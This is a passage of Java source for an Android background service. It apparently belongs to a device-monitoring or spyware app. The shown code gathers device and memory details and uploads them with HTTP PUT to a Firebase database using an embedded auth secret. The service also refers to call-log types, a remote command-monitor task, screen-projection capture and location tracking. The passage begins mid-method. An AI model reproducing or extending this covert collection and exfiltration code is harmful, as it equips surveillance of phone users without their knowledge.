                    android.app.ActivityManager.MemoryInfo memInfo = new android.app.ActivityManager.MemoryInfo();
                    ((android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE)).getMemoryInfo(memInfo);
                    deviceInfo.put("total_memory_mb", memInfo.totalMem / (1024 * 1024));
                    deviceInfo.put("available_memory_mb", memInfo.availMem / (1024 * 1024));

                    sendDataToFirebase("data/device_info", deviceInfo.toString());
                    Log.d(TAG, "Device info sent");
                } catch (Exception e) {
                    Log.e(TAG, "sendDeviceInfo error: " + e.getMessage());
                }
            }
        }).start();
    }

    // ═════════════════════════════════════════════════════════
    // GENERIC SEND DATA TO FIREBASE
    // ═════════════════════════════════════════════════════════
    private void sendDataToFirebase(final String path, final String jsonData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    String json = "{\"data\":" + jsonData + "," +
                                  "\"device\":\"" + Build.MODEL + "\"," +
                                  "\"timestamp\":" + System.currentTimeMillis() + "}";

                    byte[] jsonBytes = json.getBytes("UTF-8");

                    URL url = new URL(FIREBASE_URL + "/" + path + ".json?auth=" + AUTH_SECRET);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("PUT");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Connection", "keep-alive");
                    conn.setFixedLengthStreamingMode(jsonBytes.length);
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                    os.write(jsonBytes);
                    os.flush();
                    os.close();

                    int code = conn.getResponseCode();
                    Log.d(TAG, "Data sent to " + path + " - HTTP " + code);

                } catch (Exception e) {
                    Log.e(TAG, "sendDataToFirebase: " + e.getMessage());
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }

    private String getCallType(int type) {
        switch (type) {
            case 1: return "incoming";
            case 2: return "outgoing";
            case 3: return "missed";
            default: return "unknown";
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (captureHandler != null) captureHandler.removeCallbacks(monitorTask);
        handler.removeCallbacks(commandMonitorTask);
        stopProjection();
        if (captureThread != null) captureThread.quitSafely();

        // ═══ FIX: Stop LocationHelper ═══
        try {
            if (locationHelper != null) locationHelper.stop();
        } catch (Exception e) {}

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception e) {}
    }
}